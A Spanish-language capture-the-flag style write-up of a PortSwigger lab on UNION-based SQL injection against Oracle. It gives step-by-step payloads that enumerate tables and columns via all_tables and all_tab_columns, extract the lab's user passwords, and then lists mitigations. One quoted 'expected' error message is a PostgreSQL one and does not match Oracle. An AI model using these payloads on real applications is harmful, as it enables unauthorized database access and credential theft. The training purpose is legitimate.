---
title: "Ataque de inyección SQL, listando el contenido de la base de datos en Oracle"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "ataque-de-inyeccion-sql-listando-el-contenido-de-la-base-de-datos-en-oracle"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "union"
  - "oracle"
  - "practitioner"
techniques:
  - "SQL Injection"
  - "UNION attack"
  - "Oracle"
  - "FROM dual"
  - "all_tables"
  - "all_tab_columns"
  - "enumeración completa de BD"
tools:
  - "BurpSuite"
flags_list:
  - label: "administrator"
    value: "z2cv5eag7qnnwg7tb7jz"
  - label: "carlos"
    value: "pwol05l6ubzeg8aj1b3j"
  - label: "wiener"
    value: "v4e8nkmtuu3ejtkjytfu"
summary: "Este laboratorio explota una vulnerabilidad de SQL Injection en Oracle Database. La falla ocurre porque la entrada del usuario se concatena directamente en la consulta SQL sin sanitización. En Oracle todo SELECT requiere FROM, lo que obliga a usar dual. Este lab introduce all_tables y all_tab_columns — los equivalentes Oracle de information_schema. Cadena de ataque: detección → UNION NULL FROM dual (2 columnas) → all_tables → tabla USERS_JUUAKM → all_tab_columns → columnas → extracción → 3 usuarios comprometidos.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El error de sintaxis demuestra que la entrada del usuario se inserta directamente en la consulta SQL."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El hecho de que `--` funcione ya es un indicador — pero la confirmación definitiva de Oracle llegará cuando el `UNION SELECT NULL FROM dual` no falle. Sin `FROM dual`, Oracle siempre lanza error, incluso con el número correcto de columnas."
      - kind: "callout"
        type: "danger"
        label: "Pista del lab"
        text: "En las bases de datos Oracle, cada `SELECT` debe especificar una tabla con `FROM`. Hay una tabla incorporada llamada `dual`. Por ejemplo: `UNION SELECT 'abc' FROM dual`"

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2--   → Éxito
          '+ORDER+BY+1,2,3-- → Error
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142730399.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo confirma que la consulta devuelve 2 columnas."
      - kind: "note"
        text: |
          Validación con UNION SELECT en Oracle:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL FROM dual--           → Error (1 col)
          ' UNION SELECT NULL,NULL FROM dual--      → Éxito ✓ (2 cols)
          ' UNION SELECT NULL,NULL,NULL FROM dual-- → Error (3 cols)
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144035966.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se confirma que la consulta requiere 2 columnas para que el UNION sea válido."
      - kind: "note"
        text: |
          Prueba de compatibilidad con datos de cadena:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT 'a',NULL FROM dual-- → Éxito ✓
          ' UNION SELECT NULL,'a' FROM dual-- → Éxito ✓
          ' UNION SELECT 'a','a' FROM dual--  → Éxito ✓
      - kind: "note"
        text: |
          Ambas columnas aceptan strings.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En Oracle los nombres de tablas del sistema son en MAYÚSCULAS. Si buscas `users` en minúsculas no encontrarás nada — usa `WHERE table_name LIKE 'USER%'` para filtrar eficientemente."

  - id: "step3"
    num: "03"
    title: "Paso 1 — Listar tablas con all_tables"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT table_name,NULL FROM all_tables--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144216204.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Filtrando los resultados, la tabla más relevante es `USERS_JUUAKM`."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Mismo patrón de ofuscación que en el lab no-Oracle — tablas con sufijos aleatorios. La diferencia es que aquí usas `all_tables` en lugar de `information_schema.tables`. La lógica es idéntica, solo cambia el nombre de la vista de metadatos."

  - id: "enum"
    num: "04"
    title: "Paso 2 — Listar columnas de la tabla objetivo"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_JUUAKM'--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144343087.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Columnas encontradas:
      - kind: "bullet"
        text: "EMAIL"
      - kind: "bullet"
        text: "PASSWORD_RPWWXL"
      - kind: "bullet"
        text: "USERNAME_CWVGCG"

  - id: "access_1"
    num: "05"
    title: "Paso 3 — Extracción de credenciales"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT USERNAME_CWVGCG,PASSWORD_RPWWXL FROM USERS_JUUAKM--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144507553.jpg"
        caption: "Evidencia técnica"

  - id: "exploit"
    num: "06"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Credenciales de TODOS los usuarios extraídas via enumeración Oracle. Login exitoso como administrator.
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144632794.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "administrator"
        value: "z2cv5eag7qnnwg7tb7jz"
      - label: "carlos"
        value: "pwol05l6ubzeg8aj1b3j"
      - label: "wiener"
        value: "v4e8nkmtuu3ejtkjytfu"

  - id: "privesc_1"
    num: "07"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

  - id: "step8_1"
    num: "08"
    title: "Listado del contenido de la base de datos en Oracle"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          -- Listar tablas
          SELECT table_name FROM all_tables
          
          -- Listar columnas de una tabla
          SELECT column_name FROM all_tab_columns WHERE table_name = 'NOMBRE_TABLA'
      - kind: "table"
        headers:
          - "Acción"
          - "No-Oracle"
          - "Oracle"
        rows:
          - ["Listar tablas", "`information_schema.tables`", "`all_tables`"]
          - ["Listar columnas", "`information_schema.columns`", "`all_tab_columns`"]
          - ["UNION syntax", "`UNION SELECT NULL--`", "`UNION SELECT NULL FROM dual--`"]
          - ["Case sensitivity", "minúsculas", "MAYÚSCULAS"]
      - kind: "callout"
        type: "danger"
        label: "SQL ERROR esperado"
        text: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."

lessons:
  - 'En Oracle siempre se requiere `FROM dual` en cualquier `UNION SELECT`.'
  - 'La enumeración de tablas y columnas se realiza con `all_tables` y `all_tab_columns`.'
  - 'En auditorías reales, documentar cada paso con capturas y evidencias fortalece el reporte.'
mitigation:
  - 'Implementar consultas parametrizadas en Oracle (bind variables).'
  - 'Restringir acceso a vistas de metadatos (`all_tables`, `all_tab_columns`).'
  - 'Configurar principio de mínimo privilegio en la base de datos.'
  - 'Aplicar WAF con reglas específicas para detectar `UNION SELECT`.'
  - 'Validar y sanitizar entradas de usuario antes de construir consultas.'
---
